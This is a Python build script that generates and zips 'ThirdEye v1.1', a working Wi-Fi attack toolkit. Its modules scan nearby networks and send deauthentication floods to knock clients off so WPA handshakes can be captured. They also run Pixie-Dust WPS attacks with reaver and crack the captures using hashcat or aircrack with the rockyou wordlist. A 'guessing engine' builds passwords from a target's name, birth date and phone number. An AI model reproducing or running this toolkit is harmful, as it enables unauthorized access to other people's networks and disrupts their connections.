import os
import zipfile

# Define all project files and their updated content
project_files = {
    "setup.sh": r"""#!/bin/bash
# ThirdEye v1.1 Unified Setup Script
echo -e "\e[1;34m🧿 ThirdEye: Initializing Advanced Setup...\e[0m"
if [ -d "/data/data/com.termux" ]; then
    ENV="Termux"; INSTALL_CMD="pkg install -y"
else
    ENV="Linux"; INSTALL_CMD="sudo apt update && sudo apt install -y"
fi
$INSTALL_CMD aircrack-ng reaver pixiewps hashcat hcxtools python nmap curl wget
if [ "$ENV" == "Linux" ]; then sudo apt install -y python3-tk; fi
pip install pandas tabulate colorama
if [ ! -f "rockyou.txt" ]; then
    echo -e "\e[1;33m[*] Downloading Wordlist...\e[0m"
    curl -L -o rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt.gz
    gunzip rockyou.txt.gz
fi
chmod +x *.py
echo -e "\e[1;32m[+] Setup Complete!\e[0m"
""",

    "main.py": r"""import os
from colorama import Fore, Style, init
from utils import check_root, toggle_monitor, create_folders
from scanner import wifi_scan
from attacks import ThirdEyeAttacks
from cracker import ThirdEyeCracker

init(autoreset=True)
last_scan = None

def select_target():
    global last_scan
    if last_scan is None or last_scan.empty:
        print(Fore.RED + "[!] Run Scan (1) first."); return None, None, None
    try:
        idx = int(input(Fore.YELLOW + "\nEnter Target ID: "))
        t = last_scan.iloc[idx]
        return t['BSSID'], str(t['channel']), t['essid']
    except: return None, None, None

def main():
    global last_scan
    is_termux = os.path.exists("/data/data/com.termux")
    if not is_termux: check_root()
    create_folders()
    iface = input("Enter Interface (e.g. wlan0): ")
    toggle_monitor(iface, "start")
    mon = iface + "mon" if "mon" not in iface else iface
    atk = ThirdEyeAttacks(mon); crk = ThirdEyeCracker()
    while True:
        print(f"\n{Fore.CYAN}1. Scan | 2. Capture | 3. Pixie | 4. Crack | 5. Exit")
        c = input("ThirdEye > ")
        if c == '1': last_scan = wifi_scan(mon)
        elif c == '2':
            b, ch, e = select_target()
            if b: atk.handshake_capture(b, ch, e)
        elif c == '3':
            b, _, _ = select_target()
            if b: atk.wps_pixie(b)
        elif c == '4':
            crk.auto_crack_selector(input("CAP Path: "))
        elif c == '5':
            toggle_monitor(mon, "stop"); break
if __name__ == "__main__": main()
""",

    "scanner.py": r"""import pandas as pd
import subprocess, os, time
from tabulate import tabulate
from colorama import Fore

def wifi_scan(interface):
    print(Fore.BLUE + "[*] Scanning 15s...")
    os.system("rm -f thirdeye_scan-01.csv")
    cmd = ["sudo", "airodump-ng", "--write", "thirdeye_scan", "--output-format", "csv", interface]
    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try: time.sleep(15)
    except KeyboardInterrupt: pass
    p.terminate()
    if os.path.exists("thirdeye_scan-01.csv"):
        df = pd.read_csv("thirdeye_scan-01.csv", skipinitialspace=True).dropna(subset=['BSSID']).reset_index(drop=True)
        print(tabulate(df[['BSSID', 'channel', 'pwr', 'essid']], headers='keys', tablefmt='psql', showindex=True))
        return df
    return None
""",

    "attacks.py": r"""import os, subprocess, time, signal
from colorama import Fore

class ThirdEyeAttacks:
    def __init__(self, iface): self.iface = iface
    def run_cmd(self, cmd):
        if not os.path.exists("/data/data/com.termux") and cmd[0] != "sudo": cmd.insert(0, "sudo")
        return cmd
    def handshake_capture(self, b, c, e):
        out = f"captures/{e.replace(' ','_')}"
        sniff = subprocess.Popen(self.run_cmd(["airodump-ng", "-c", c, "--bssid", b, "-w", out, self.iface]))
        time.sleep(5)
        subprocess.run(self.run_cmd(["aireplay-ng", "--deauth", "20", "-a", b, self.iface]))
        time.sleep(15); os.kill(sniff.pid, signal.SIGTERM)
    def wps_pixie(self, b):
        subprocess.run(self.run_cmd(["reaver", "-i", self.iface, "-b", b, "-K", "1", "-vv"]))
""",

    "cracker.py": r"""import subprocess, os
from colorama import Fore

class ThirdEyeCracker:
    def __init__(self):
        self.is_tmx = os.path.exists("/data/data/com.termux")
        p = "/usr/share/wordlists/rockyou.txt"
        self.wordlist = p if os.path.exists(p) else "rockyou.txt"

    def ai_guessing_generator(self):
        print(Fore.CYAN + "\n[ AI Guessing Engine ]")
        n = input("Name: "); d = input("DOB: "); p = input("Phone: ")
        pwds = {n+d, n+"@"+d, n+"123", p, n+p}
        with open("ai_guess.txt", "w") as f:
            for pw in pwds: 
                if len(pw) >= 8: f.write(pw + "\n")
        return "ai_guess.txt"

    def auto_crack_selector(self, cap):
        print("1. Rockyou | 2. AI-Guess | 3. Manual")
        c = input("Choice: ")
        wd = self.ai_guessing_generator() if c == '2' else self.wordlist
        eng = input("1. Hashcat | 2. Aircrack: ")
        if eng == '1':
            h = cap.replace(".cap", ".hc22000")
            subprocess.run(["hcxpcapngtool", "-o", h, cap])
            subprocess.run(["hashcat", "-m", "22000", h, wd, "--force"])
        else:
            subprocess.run(["aircrack-ng", "-w", wd, cap])
""",

    "utils.py": r"""import os, subprocess
from colorama import Fore

def check_root():
    if os.getuid() != 0: print("Run as root/tsu!"); exit()
def toggle_monitor(iface, mode):
    cmd = ["airmon-ng", mode, iface]
    if not os.path.exists("/data/data/com.termux"): cmd.insert(0, "sudo")
    subprocess.run(cmd, capture_output=True)
def create_folders():
    if not os.path.exists("captures"): os.makedirs("captures")
"""
}

def build():
    print("🧿 ThirdEye v1.1: Building Project Files...")
    with zipfile.ZipFile("ThirdEye_v1.1_Final.zip", "w") as zipf:
        for filename, content in project_files.items():
            with open(filename, "w") as f:
                f.write(content)
            zipf.write(filename)
            print(f"[+] Created {filename}")
    print("\n✅ Build Complete! Zip file: ThirdEye_v1.1_Final.zip")

if __name__ == "__main__":
    build()
